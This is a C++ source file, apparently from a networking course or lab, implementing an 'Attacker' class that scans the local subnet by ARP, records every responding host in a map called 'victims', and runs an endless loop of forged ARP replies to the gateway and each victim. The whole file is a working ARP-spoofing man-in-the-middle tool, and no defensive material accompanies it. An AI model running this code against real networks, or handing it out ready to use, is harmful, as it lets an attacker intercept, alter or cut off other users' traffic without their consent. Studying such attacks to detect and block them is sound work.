#include "attacker.hpp"
using namespace std;
void AttackerInfo::get_attacker_info(){
    struct ifreq ifr;
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if(sockfd < 0){
        perror("socket() failed");
        exit(1);
    }
    strncpy(ifr.ifr_name, interface, IFNAMSIZ-1);

    // get Mask
    if(ioctl(sockfd, SIOCGIFNETMASK, &ifr) < 0){
        perror("ioctl() failed to get netmask");
        exit(1);
    }
    memcpy(&netmask, (struct sockaddr_in *)&ifr.ifr_netmask, sizeof(struct sockaddr_in));
    // get source IP
    if(ioctl(sockfd, SIOCGIFADDR, &ifr) < 0){
        perror("ioctl() failed to get source IP address");
        exit(1);
    }
    memcpy(&src_ip, (struct sockaddr_in *)&ifr.ifr_addr, sizeof(struct sockaddr_in));
    // get source MAC
    if(ioctl(sockfd, SIOCGIFHWADDR, &ifr) < 0){
        perror("ioctl() failed to get source MAC address");
        exit(1);
    }
    memcpy(src_mac.data(), ifr.ifr_hwaddr.sa_data, 6);

    close(sockfd);
    return;
}

void AttackerInfo::get_defaultGateway(){
    ifstream file(route_table_path);
    if (!file.is_open()) {
        perror("Failed to open route file");
        exit(1);
    }

    string line;
    while (getline(file, line)) {
        vector<string> tokens;
        string token;
        istringstream tokenStream(line);
        while (getline(tokenStream, token, '\t')) {
            tokens.push_back(token);
        }

        if (tokens.size() < 3) {
            continue;
        }
        if (tokens[0] == string(interface) && tokens[1] == string("00000000")) {
            gateway_ip.sin_family = AF_INET;
            gateway_ip.sin_addr.s_addr = stoul(tokens[2], nullptr, 16);
            break;
        }
    }
    file.close();
    return;
}

AttackerInfo::AttackerInfo(char *interface){
    this->interface = interface;
    this->get_attacker_info();
    this->get_defaultGateway();
}
void AttackerInfo::print_attacker_info(){
    cout << "Source IP: " << inet_ntoa(src_ip.sin_addr) << endl;
    cout << "Netmask: " << inet_ntoa(netmask.sin_addr) << endl;
    cout << "Gateway IP: " << inet_ntoa(gateway_ip.sin_addr) << endl;
    cout << "Source MAC: ";
    for(int i = 0; i < 6; i++){
        cout << setfill('0') << setw(2) << hex << (int)src_mac[i] << ":";
    }
    cout << endl;
}

Attacker::Attacker(char *interface){
    this->interface = interface;
    this->attacker_info = AttackerInfo(interface);
    this->sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if(this->sockfd < 0){
        perror("Socket creation failed when initializing attacker object");
        exit(1);
    }
}

void Attacker::print_avaliable_devices(){
    cout << "Available devices " << endl;
    cout << "-------------------" << endl;    
    cout << "IP\t\t\tMAC" << endl;
    cout << "-------------------" << endl;
    for (auto const& x : victims){
        if(x.first == gateway_ip){
            // cout << "Gateway\t\t";
            continue;
        }
        print_victim(x.first, x.second);
    }
}
void Attacker::print_victim(IPAddress ip, MACAddress mac){
    for(int i = 0; i < 4; i++){
        
        cout << dec << (int)ip[i];
        if(i < 3){
            cout << ".";
        }
    }
    cout << "\t";
    for(int i = 0; i < 6; i++){
        cout << hex << setw(2) << setfill('0') << (int)mac[i];
        if(i < 5){
            cout << ":";
        }
    }
    cout << endl;
}
void Attacker::send_arp(arp_pkg arp, MACAddress dest_mac = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff}){
    array<uint8_t, IP_MAXPACKET> packet;
    for(int i = 0; i < 6; i++){ // Destination MAC
        packet[i] = dest_mac[i];
    }
    for(int i = 6; i < 12; i++){ // Source MAC
        packet[i] = attacker_info.src_mac[i - 6];
    }
    packet[12] = ETH_P_ARP / 256;
    packet[13] = ETH_P_ARP % 256;
    for(int i = 14; i < 42; i++){ // ARP header
        packet[i] = reinterpret_cast<uint8_t*>(&arp)[i - 14];
    }
    if(sendto(sockfd, packet.data(), 42, 0, (struct sockaddr*)&device, sizeof(device)) < 0){
        perror("sendto() failed to send ARP request");
        exit(1);
    }
    // cout << "ARP request sent to all devices in the network" << endl;
}
void Attacker::arp_spoof(){
    // cout << "ARP spoofing..." << endl;
    while(true){
        for(auto victim:victims){
            if(victim.first == gateway_ip){
                continue;
            } 
            arp_pkg arp_to_gateway = make_arp(ARPOP_REPLY, 
                                            victim.first, 
                                            attacker_info.src_mac, 
                                            gateway_ip, 
                                            gateway_mac);
            arp_pkg arp_to_victim = make_arp(ARPOP_REPLY,
                                                gateway_ip,
                                                attacker_info.src_mac,
                                                victim.first,
                                                victim.second);
            send_arp(arp_to_gateway,gateway_mac);
            send_arp(arp_to_victim,victim.second);
        }
        this_thread::sleep_for(chrono::seconds(1));
    }   
}
void Attacker::receive_arp(){
    array<uint8_t, IP_MAXPACKET> packet;
    struct sockaddr saddr;
    int saddr_size = sizeof(saddr);
    int received_bytes;
    

    auto start_time = chrono::system_clock::now();
    while (chrono::system_clock::now() - start_time < chrono::seconds(3)) {
        received_bytes = recvfrom(sockfd, packet.data(), IP_MAXPACKET, 0, &saddr, (socklen_t*)&saddr_size);
        if(received_bytes < 0){
            perror("recvfrom() failed to receive ARP reply");
            exit(1);
        }
        if(packet[12] != ETH_P_ARP / 256 && packet[13] != ETH_P_ARP % 256){
            continue;
        }
        arp_pkg arp;
        for(int i = 14; i < 42; i++){
            reinterpret_cast<uint8_t*>(&arp)[i - 14] = packet[i];
        }
        
        if (ntohs(arp.Operation) != ARPOP_REPLY){
            continue;
        }
        IPAddress ip;
        MACAddress mac;
        for(int i = 0; i < 4; i++){
            ip[i] = arp.SenderProtocolAddress[i];
        }
        for(int i = 0; i < 6; i++){
            mac[i] = arp.SenderHardwareAddress[i];
        }
        uint32_t full_ip = 0;
        for(int i = 0; i < 4; i++){
            full_ip |= ip[i] << (8 * i);
        }
        
        if( full_ip == attacker_info.src_ip.sin_addr.s_addr){
            continue;
        }
        if (full_ip == attacker_info.gateway_ip.sin_addr.s_addr){
            gateway_ip = ip;
            gateway_mac = mac;
        }
        // for(int i =0 ; i<4 ;i++){
        //     cout << ip[i] << ".";
        // }cout << "\n";
        // for(int i = 0; i < 6; i++){
        //     cout << hex << setw(2) << setfill('0') << (int)mac[i];
        // }cout << "\n";
        victims[ip] = mac;
    }
}
void Attacker::scan(){
    victims.clear();
    // send arp request to all devices in the network
    uint32_t base_ip = ntohl(attacker_info.src_ip.sin_addr.s_addr & attacker_info.netmask.sin_addr.s_addr);
    uint32_t mask = ntohl(~attacker_info.netmask.sin_addr.s_addr);
    arp_pkg arp = make_arp(ARPOP_REQUEST,IPAddress{},attacker_info.src_mac,IPAddress{}, MACAddress{});
    for(int i = 0; i < 4; i++){
        // https://blog.csdn.net/dongyanxia1000/article/details/80683738
        arp.SenderProtocolAddress[i] = reinterpret_cast<uint8_t*>(&attacker_info.src_ip.sin_addr.s_addr)[i];
    }
    for (uint32_t i = 1; i < mask; i++){
        // cout << "Sending ARP request to " << i << endl;
        uint32_t ip =  htonl(base_ip | i);
        for(int i = 0; i < 4; i++){
            arp.TargetProtocolAddress[i] = reinterpret_cast<uint8_t*>(&ip)[i];
        }
        send_arp(arp);
    }
    // receive arp reply
    // add the device to the victims map
    receive_arp();
    print_avaliable_devices();
}
arp_pkg Attacker::make_arp(uint16_t operation = ARPOP_REQUEST, IPAddress sender_ip = {}, MACAddress sender_mac = {}, IPAddress target_ip = {}, MACAddress target_mac = {}){
    arp_pkg arp;
    arp.HardwareType = htons(1);
    arp.ProtocolType = htons(ETH_P_IP);
    arp.HardwareLength = 6;
    arp.ProtocolLength = 4;
    arp.Operation = htons(operation);

    for(int i = 0; i < 6; i++){
        arp.SenderHardwareAddress[i] = sender_mac[i];
        arp.TargetHardwareAddress[i] = target_mac[i];
    }
    for(int i = 0; i < 4; i++){
        arp.SenderProtocolAddress[i] = sender_ip[i];
        arp.TargetProtocolAddress[i] = target_ip[i];
    }
    return arp;
}
